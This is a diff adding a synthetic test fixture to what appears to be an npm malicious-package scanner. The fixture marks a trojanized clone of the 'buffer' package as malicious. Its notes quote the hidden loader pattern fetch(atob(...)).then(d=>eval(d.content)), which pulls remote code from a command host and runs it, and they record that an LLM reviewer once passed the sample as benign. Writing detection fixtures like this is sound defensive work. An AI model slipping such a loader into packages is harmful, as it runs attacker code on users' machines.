@@ -1,0 +1,13 @@
+ecosystem = "npm"
+name = "buffer-helpers"
+version = "1.0.0"
+label = "bad"
+expected_verdict = "malicious"
+expect_rules = ["obfuscation.remote_fetch_eval"]
+notes = """Regression anchor for the buffer-utilities miss (2026-06-08). A trojanized clone
+of Feross's `buffer` package injected one IIFE: fetch(atob(<b64 C2 url>)).then(d=>eval(d.content)).
+The executed payload is REMOTE, so the local decode->eval rules (charcode/crypto) missed it,
+it scored with NO crit/high rule, and the LLM cleared it as benign. A base64-HIDDEN fetch URL
+feeding eval is a remote-code loader -> critical -> malicious on rules alone. (C2 b64 below is a
+benign placeholder decoding to example.com; the rule fires on the fetch(atob)->eval SHAPE.)"""
+provenance = "synthetic"
